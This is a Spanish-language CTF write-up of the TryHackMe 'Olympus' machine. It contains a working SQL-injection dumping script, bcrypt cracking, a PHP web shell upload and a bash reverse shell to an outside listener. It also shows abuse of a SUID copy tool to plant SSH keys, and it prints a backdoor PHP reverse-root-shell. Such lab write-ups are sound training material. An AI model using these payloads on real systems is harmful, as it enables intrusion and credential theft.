Write up de la maquina Olympus una maquina de dificutal media de la plataforma de TryHackMe.
![](/assets/img/olympus/machine.png)

## Enumeracion
Empezemos detectando que puertos abiertos tiene la maquina victima

```bash
❯ nmap 10.10.243.117
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 16:37 -05
Nmap scan report for olympus.thm (10.10.243.117)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 41.49 seconds
```
Veamos que version corre para estos puertos que estan abiertos
```bash
❯ nmap -sCV -p22,80 10.10.243.117 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 16:40 -05
Nmap scan report for 10.10.243.117
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a7814042cdf25fb4ea21434800b8539 (RSA)
|   256 8d5601ca55dee17c6404cee6f1a5c7ac (ECDSA)
|_  256 1fc1be3f9ce78e243334a644af684c3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
En lo que reporta nmap vemos que en el servidor web se aplica un redirect a http://olympus.thm como nuestra maquina no sabe que es esto tenemos que agregarlo al /etc/hosts para que puedo resolvernos 
```bash
❯ echo '10.10.243.117 olympus.thm' >> /etc/hosts
```
Veamos el servidor web.
![](/assets/img/olympus/web.png)
la web no tiene nada interesante, hagamos fuzzing con gobuster para descubrir directorios de la pagina Web.
```bash
❯ gobuster dir -t 200 -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://olympus.thm/ --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/22 16:47:59 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]                                     
/server-status        (Status: 403) [Size: 276]                                     
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]    
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
                                                                                    
===============================================================
2023/02/22 16:48:29 Finished
===============================================================
```
Encontramos un directorio muy interesante ~webmaster veamos que contenido tiene este directorio.
![](/assets/img/olympus/cms.png)
Al entrar a este directorio tenemos muchas mas cosas para enumerar vemos que hay un cms corriendo por detras busquemos aver si este cms tiene alguna vulnerabilidad
```bash
❯ searchsploit victor cms
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                                                                                                                                            | php/webapps/48511.txt
Victor CMS 1.0 - 'cat_id' SQL Injection                                                                                                                                                                | php/webapps/48485.txt
Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting                                                                                                                                      | php/webapps/48484.txt
Victor CMS 1.0 - 'post' SQL Injection                                                                                                                                                                  | php/webapps/48451.txt
Victor CMS 1.0 - 'Search' SQL Injection                                                                                                                                                                | php/webapps/48734.txt
Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting                                                                                                                                      | php/webapps/48626.txt
Victor CMS 1.0 - Authenticated Arbitrary File Upload                                                                                                                                                   | php/webapps/48490.txt
Victor CMS 1.0 - File Upload To RCE                                                                                                                                                                    | php/webapps/49310.txt
Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                                                                                                                                                | php/webapps/49282.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Y vemos que el cms tiene una vulnerabilidad de inyeccion sql, para esta inyeccion sql hize un script en python para ir dumpeando los datos que me interesen.

## Sql Injection
script en python
```python
#!/usr/bin/python3

import time, pdb, requests, sys, signal, re

def ctrl_c(sig, frame):
    
    print("\n\n[!] Saliendo..\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, ctrl_c)

# Variables
url = 'http://olympus.thm/~webmaster/category.php?cat_id='
Burp = {'http': 'http://127.0.0.1:8080'}

if len(sys.argv) < 2:
    print ("\nUso: \n\t%s 'schema_name' 'from information_schema.schemata'\n" % sys.argv[0])
    sys.exit(1)

def makeRequest(injection):
    
    main_url = url + injection
    injection = requests.get(main_url)
    return injection

def InjectionSql():
    
    one = sys.argv[1]
    two = sys.argv[2]

    payload = '-1+UNION+SELECT+1,2,3,%s,5,6,7,8,9,10+%s--' % (one, two)
    injection = makeRequest(payload)
    output = re.findall('by <a href="#">(.*?)</a>', injection.text)
    output = str(output).strip("[]")
    print (f"\n{output}\n")

if __name__ == "__main__":

    InjectionSql()
```

Veamos cual es el nombre de la base de datos actualmente en uso.
```bash
❯ python3 sqlI.py "database()" ""

'olympus'
```
Veamos los nombre de todas las bases de datos.
```bash
❯ python3 sqlI.py "group_concat(schema_name)" "from information_schema.schemata"

'mysql,information_schema,performance_schema,sys,phpmyadmin,olympus'
```
Voy a enumerar primero la base de datos olympus que es la que se esta utilizando en la pagina web, enumeremos sus tablas.
```bash
❯ python3 sqlI.py "group_concat(table_name)" "from information_schema.tables where table_schema='olympus'"

'categories,chats,comments,flag,posts,users'
```
Y vemos tablas muy interesantes, enumeremos las columnas de la tabla users.
```bash
❯ python3 sqlI.py "group_concat(column_name)" "from information_schema.columns where table_schema='olympus' and table_name='users'"

'user_id,user_name,user_firstname,user_lastname,user_password,user_email,user_image,user_role,randsalt'
```
Veamos los datos de 3 columnas user_email, user_name y user_password, y obtenemos contraseñas que no estan en texto claro, lo del 0x3a es ":" pero en hexadecimal esto para que cada columna me la separe por los dos puntos.
```bash
❯ python3 sqlI.py "group_concat(user_email,0x3a,user_name,0x3a,user_password)" "from users" |tr "," "\n"
prometheus@olympus.thm:prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
root@chat.olympus.thm:root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
zeus@chat.olympus.thm:zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
```
pongamos estos hashes en un archivo e intentemos romperlos para ver la contraseña en texto claro.
```bash
❯ cat hashes.txt
prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
```
utilizaremos john para esto
```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summertime       (prometheus)
1g 0:00:10:26 0,12% (ETA: 2023-02-28 17:44) 0.001597g/s 33.12p/s 72.80c/s 72.80C/s newports..frangipani
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```
Tenemos la credencial para el usuario prometheus, cuando dumpeamos los datos de las columnas vi algo interesante en el user_email hay uno sub dominio el cual es chat.olympus.thm agreguemoslo al /etc/hosts para ver si nos resuleve a un sitio diferente.
```bash
❯ echo '10.10.243.117 chat.olympus.thm' >> /etc/hosts
```
Al entrar a este subdominio vemos un login, autentiquemosnos con las credenciales que tenemos de prometheus, una vez dentro veremos esta pagina
![](/assets/img/olympus/sub.png)
Podemos subir archivos por lo que ya veo una via para poder obtener un RCE, el unico detalle es que en el chat hablan de que al momento de subir el archivo se le cambia el nombre por uno aleatorio, creemos un shell.php y subamoslo

```php
❯ cat shell.php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
Si subimos este archivo a la web se sube al directorio /uploads pero no conocemos el nombre de como lo a guardado el servidor, volvamos un poco atras a la inyeccion sql, y enumeremos otra ves las tablas.
```bash
❯ python3 sqlI.py "group_concat(table_name)" "from information_schema.tables where table_schema='olympus'"

'categories,chats,comments,flag,posts,users'
```
Vemos que esta una tabla llamada chats veamos sus columnas
```bash
❯ python3 sqlI.py "group_concat(column_name)" "from information_schema.columns where table_schema='olympus' and table_name='chats'"

'uname,msg,dt,file'
```
Veo ya algo muy interesante que es file veamos cual es el contenido de esta columna
```bash
❯ python3 sqlI.py "group_concat(uname,0x3a,file)" "from chats"

'prometheus:47c3210d51761686f3af40a875eeaaea.txt,prometheus:,zeus:,prometheus:cfec573d9ded23bcc54625918628e603.php'
```
Y podemos ver cual es el nombre con el cual el servidor guardo nuestro archivo shell.php , veamos si esto ahora funciona, y tenemos ya capacidad de ejecutar comandos en la maquina victima
```bash
❯ curl -s -X GET -G "http://chat.olympus.thm/uploads/cfec573d9ded23bcc54625918628e603.php" --data-urlencode 'cmd=whoami;hostname -I'  |html2text
www-data
10.10.139.93
```
Teniendo ya capacidad de ejecutar comandos me voy a enviar una revershell.
```bash
❯ curl -s -X GET -G "http://chat.olympus.thm/uploads/cfec573d9ded23bcc54625918628e603.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.8.47.45/4444 0>&1'"
```
Y recibo la conexion por debajo
```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.47.45] from (UNKNOWN) [10.10.139.93] 52828
bash: cannot set terminal process group (759): Inappropriate ioctl for device
bash: no job control in this shell
www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ whoami
whoami
www-data
www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ 
```

## Movimiento lateral

Si buscamos por archivos suid en la maquina encontramos esto
```bash
www-data@olympus:/$ find \-perm -4000 2>/dev/null  |grep 'ils$'
./usr/bin/cputils
www-data@olympus:/$ 
```
Si miramos quien es el propietatio de este archivo, el propietario es zeus
```bash
www-data@olympus:/$ ls -la /usr/bin/cputils 
-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
www-data@olympus:/$ 
```
Este archivo al ejecutarlo nos deja copiar un archivo y depositalo en otro ruta, como vi que el propietario es zeus copiemos su id_rsa en /tmp
```bash
www-data@olympus:/$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /tmp/id_rsa

File copied successfully.
www-data@olympus:/$ 
```
Miramos en tmp y si tenemos la id_rsa del usuario zeus
```bash
www-data@olympus:/$ cat /tmp/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
eRZjPBIy1rjIUiWe6LS1ToEyqfY=
-----END OPENSSH PRIVATE KEY-----
```
La id_rsa esta protejida por contraseña, para no perder el tiempo trantando de encontrar la contraseña de la id_rsa, voy a copiar un authorized_keys con mi clave publica en el directorio .ssh del usuario zeus.

Creamos el par de claves
```bash
❯ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/blank/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/blank/.ssh/id_rsa
Your public key has been saved in /home/blank/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:2y7bGIXQ6qbQqkG5ckV4a3Tbt7mq58+XQ+zUfNM5MOQ blank@Pez
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|   .   .     .   |
|  . + o .   o    |
|  .+ o = .   E   |
| o  + o S o. oo o|
|. .+ .   = o+ o+o|
|o.o . o o ++ . .o|
|.o o o  o* .=    |
|... . .+==*. .   |
+----[SHA256]-----+
```

Creamos un archivo como authorized_keys con nuestra llave publica
```bash
www-data@olympus:/tmp$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0t2tdenmtdG84kou+jWFcCHZkWdxJtKAXG/Wct9pDFVw8l/T1W3OkYRsA/aIlNsepNnC2JNG04p+38+kwVAZ4oJkkkhnKEpOEyjWFjnbX1om8nHhkg1f0JM0hJBNiSZO61/0RO6I+aaR0pc+vb6hdHshAnqhBflaaW/z6PClqn0oyO4sPGp8DTLyXU4MDMKmjbUzvgdwWcn/4ec+h78jD8jS/5sfQX7XOuR3GL3Nfyp7P0eFCvEExuQwVqtDe35NlwpVwtMUgvehjUDTLpZ3pq2qAemRRxWJ3HigbSHJ+WFE2zGUYY6Zi6TQRG6bb6a2d2a6Z2wh+yc9yRRfgDargsR4gaQl5l4vPPfCqUE2r1rS+1UFabm1IHjoyglQ3B+dP8KRPAN18LIfJwVkB+RoNiVnQw+uiHKUWnazKebrQ/es/bZh/zp1kRhyBW9WnJzb7JmHkV87Qz5AFg9pJkxm6iJqdcL/nmxGhqDlUsAgYANXRX28/yr+v9NBdinKTUVM= blank@machine
```
Ahora copiemos este archivo en el directorio .ssh del usuario zeus
```bash
www-data@olympus:/tmp$ /usr/bin/cputils 
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /tmp/authorized_keys

Enter the Name of Target File: /home/zeus/.ssh/authorized_keys

File copied successfully.
*** stack smashing detected ***: terminated
Aborted (core dumped)
www-data@olympus:/tmp$ 
```
Ahora si no conectamos por ssh no nos deveria pedir contraseña
```bash
❯ ssh zeus@olympus.thm
Warning: Permanently added the ECDSA host key for IP address '10.10.228.237' to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 23 Feb 2023 07:06:52 PM UTC

  System load:  0.09              Processes:             125
  Usage of /:   43.6% of 9.78GB   Users logged in:       0
  Memory usage: 61%               IPv4 address for eth0: 10.10.228.237
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

33 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 16 07:52:39 2022
zeus@olympus:~$ whoami
zeus
zeus@olympus:~$ 
```

## Escalada De Privilegios

Si buscamos desde la raiz por archivos del grupo zeus encontramos unos cuantos
```bash
zeus@olympus:/$ find -group zeus 2>/dev/null |grep var
./var/www/olympus.thm/public_html/~webmaster/search.php
./var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc
./var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
./var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
./var/crash/_usr_bin_cp-utils.1000.crash
```
Si vemos el contenido del archivo del archivo VIGQFQFMYOST.php, y analizamos un poco el codigo hay un backdoor implementando por aqui aprovechemos esto para escalar privilegios.

```bash
zeus@olympus:/$ cat ./var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
```
Para aprovecharnos de esto y escalar privelegios solamente tenemos que ejecutar esto
```bash
zeus@olympus:/$ /lib/defended/libc.so.99
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus)
```
Gracias Por leer
